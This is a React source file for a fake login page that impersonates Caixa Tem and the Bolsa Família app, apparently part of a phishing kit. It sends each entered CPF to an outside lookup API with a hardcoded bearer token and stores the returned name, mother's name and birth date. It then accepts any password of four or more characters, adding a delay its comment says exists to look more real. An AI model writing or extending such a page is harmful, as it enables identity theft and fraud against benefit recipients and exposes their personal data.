import { useState } from 'react';
import { useLocation } from 'wouter';
import { motion } from 'framer-motion';
import { User, KeyRound, Eye, EyeOff, HelpCircle } from 'lucide-react';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Alert, AlertDescription } from '@/components/ui/alert';
import caixaLogo from '@assets/caixa tem logo.webp';
import { prepareUrlWithParams } from '../lib/utmHandler';
import { useToast } from '@/hooks/use-toast';

export default function Login() {
  const [, navigate] = useLocation();
  const [cpf, setCpf] = useState('');
  const [step, setStep] = useState(1); // 1 = CPF, 2 = Senha
  const [senha, setSenha] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  // Formata o CPF enquanto digita
  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setErrorMessage('');
    const value = e.target.value.replace(/\D/g, ''); // Remove todos os não-dígitos
    
    if (value.length <= 11) {
      // Formata o CPF como 000.000.000-00
      let formattedValue = value;
      if (value.length > 3) {
        formattedValue = value.replace(/^(\d{3})(\d)/, '$1.$2');
      }
      if (value.length > 6) {
        formattedValue = formattedValue.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
      }
      if (value.length > 9) {
        formattedValue = formattedValue.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
      }
      
      setCpf(formattedValue);
    }
  };

  const handleNextStep = async () => {
    if (step === 1) {
      // Validação de CPF
      const numericCPF = cpf.replace(/\D/g, '');
      if (numericCPF.length !== 11) {
        setErrorMessage('CPF Inválido');
        return;
      }

      setLoading(true);
      try {
        // Consulta a API para verificar o CPF
        const response = await fetch(`https://datagetapi.online/api/v1/cpf/${numericCPF}`, {
          method: 'GET',
          headers: {
            'Authorization': 'Bearer fed55ffa1d483c9d8770ed3e2187823fa268d5f70b27fb66badb3284eca6d5db'
          }
        });

        if (response.ok) {
          const data = await response.json();
          console.log('Dados do CPF:', data);
          
          // Armazenar os dados do usuário para uso posterior
          localStorage.setItem('userData', JSON.stringify({
            cpf: numericCPF,
            nome: data.NOME || 'Usuário',
            mae: data.NOME_MAE || '',
            nasc: data.NASC || ''
          }));
          
          setStep(2);
        } else {
          setErrorMessage('CPF não encontrado');
        }
      } catch (error) {
        console.error('Erro ao consultar CPF:', error);
        setErrorMessage('Erro ao verificar o CPF');
      } finally {
        setLoading(false);
      }
    } else {
      // Validação simples de senha
      if (senha.length < 4) {
        setErrorMessage('Senha deve ter pelo menos 4 caracteres');
        return;
      }

      try {
        setLoading(true);
        // Simulação de login
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        const numericCPF = userData.cpf || cpf.replace(/\D/g, '');
        const userName = userData.nome || 'Usuario';
        
        // Atraso simulado para parecer mais real
        await new Promise(resolve => setTimeout(resolve, 800));
        
        // Redirecionar para a página principal com nome e CPF
        navigate(prepareUrlWithParams(`/home/${encodeURIComponent(userName)}/${numericCPF}`));
      } catch (error) {
        setErrorMessage('Erro ao fazer login');
        console.error(error);
      } finally {
        setLoading(false);
      }
    }
  };

  const handleBackClick = () => {
    if (step === 2) {
      setStep(1);
      setErrorMessage('');
    } else {
      navigate(prepareUrlWithParams('/welcome'));
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="min-h-screen w-full flex flex-col bg-white font-sans text-[#00496D]">
      <div className="p-5 text-center">
        <img 
          src={caixaLogo} 
          alt="Logo Caixa" 
          className="w-36 h-auto mx-auto mb-2" 
        />
        <h2 className="text-[16px] font-semibold text-[#1a73e8] mb-2">
          Aplicativo Bolsa Família
        </h2>
      </div>
      
      <motion.div 
        className="flex-1 px-5 flex flex-col"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3 }}
      >
        {step === 1 ? (
          <>
            <p className="text-[18px] text-[#2b4d50] mb-6 text-center px-4">
              Informe seu CPF e clique em "Próximo" para continuar:
            </p>
            
            {errorMessage && (
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="bg-[#ffe5e5] text-[#cc0000] font-semibold p-3 mb-4 rounded-md text-center"
              >
                {errorMessage}
              </motion.div>
            )}
            
            <div className="flex items-center border-b-2 border-[#d6802f] mb-6 pb-1.5 max-w-md mx-auto">
              <User className="text-gray-500 mr-2 min-w-5" size={20} />
              <Input
                type="text"
                value={cpf}
                onChange={handleCPFChange}
                placeholder="CPF"
                className="border-none shadow-none focus-visible:ring-0 text-[#2b4d50] px-0 text-base"
                maxLength={14}
              />
            </div>
            
            <Button
              onClick={handleNextStep}
              disabled={loading}
              className="w-full max-w-md mx-auto py-3 bg-[#d6802f] hover:bg-[#c77529] text-white font-semibold rounded-md mb-8"
            >
              {loading ? 'Verificando...' : 'Próximo'}
            </Button>
            
            <div className="mt-auto flex justify-center pb-4">
              <Button
                variant="ghost"
                className="text-[#1a73e8] font-semibold flex items-center gap-1.5"
                onClick={() => {}}
              >
                <HelpCircle size={18} />
                Preciso de ajuda
              </Button>
            </div>
          </>
        ) : (
          <>
            <p className="text-[18px] text-[#2b4d50] mb-6 text-center px-4">
              Informe sua senha:
            </p>
            
            {errorMessage && (
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="bg-[#ffe5e5] text-[#cc0000] font-semibold p-3 mb-4 rounded-md text-center"
              >
                {errorMessage}
              </motion.div>
            )}
            
            <div className="flex items-center border-b-2 border-[#d6802f] mb-6 pb-1.5 max-w-md mx-auto relative">
              <KeyRound className="text-gray-500 mr-2 min-w-5" size={20} />
              <Input
                type={showPassword ? "text" : "password"}
                value={senha}
                onChange={(e) => { 
                  setSenha(e.target.value);
                  setErrorMessage('');
                }}
                placeholder="Senha"
                className="border-none shadow-none focus-visible:ring-0 text-[#2b4d50] px-0 text-base pr-8"
              />
              <button
                type="button"
                onClick={togglePasswordVisibility}
                className="absolute right-0 text-gray-500"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
            
            <div className="grid grid-cols-2 gap-4 mb-6 max-w-md mx-auto">
              <Button
                onClick={handleBackClick}
                variant="outline"
                className="py-3 border-[#d6802f] text-[#d6802f] hover:bg-orange-50"
              >
                Voltar
              </Button>
              
              <Button
                onClick={handleNextStep}
                disabled={loading}
                className="py-3 bg-[#d6802f] hover:bg-[#c77529] text-white"
              >
                {loading ? 'Entrando...' : 'Entrar'}
              </Button>
            </div>
            
            <p className="text-[#1a73e8] mb-6 text-center">
              <a href="#" className="underline font-semibold">Esqueceu sua senha?</a> <a href="#" className="underline font-semibold">Recuperar Senha</a>
            </p>
            
            <div className="mt-auto flex justify-center pb-4">
              <Button
                variant="ghost"
                className="text-[#1a73e8] font-semibold flex items-center gap-1.5"
                onClick={() => {}}
              >
                <HelpCircle size={18} />
                Preciso de ajuda
              </Button>
            </div>
          </>
        )}
      </motion.div>
    </div>
  );
}